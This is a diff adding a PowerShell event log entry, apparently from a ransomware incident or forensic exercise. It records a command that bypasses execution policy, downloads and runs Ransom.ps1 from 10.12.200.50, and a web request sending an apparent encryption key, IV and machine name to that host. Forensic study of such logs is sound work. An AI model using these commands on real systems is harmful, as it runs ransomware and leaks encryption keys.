@@ -1,0 +1,35 @@
+CommandInvocation(Invoke-WebRequest): "Invoke-WebRequest"
+ParameterBinding(Invoke-WebRequest): name="Uri"; value="http://10.12.200.50/key=kwyuLuIM66SllKElfnJbFBZz+8LHa/jLVd34xLsNr3M=&iv=XZ1uD7cFGJwKx7AhqgGp5g==&pc=OIK-CLIENT"
+TerminatingError(Invoke-WebRequest): "<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.52 (Debian) Server at 10.12.200.50 Port 80</address>
+</body></html>
+"
+
+
+Контекст:
+        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.14409.1005
+        Host ID = f6522873-653a-46a8-873b-b0e0602a965e
+        Host Application = powershell.exe -ep bypass (new-object system.net.webclient).DownloadFile('http://10.12.200.50/Ransom.ps1','C:\Ransom.ps1');import-module C:\Ransom.ps1; Ransom -IP 10.12.200.50
+        Engine Version = 5.1.14409.1005
+        Runspace ID = 2b3b1a8e-5e72-47b1-ad19-b9ef92055c2d
+        Pipeline ID = 1
+        Command Name = Invoke-WebRequest
+        Command Type = Cmdlet
+        Script Name = C:\Ransom.ps1
+        Command Path = 
+        Sequence Number = 25
+        User = company\Administrator
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+
+
+Данные пользователя:
+
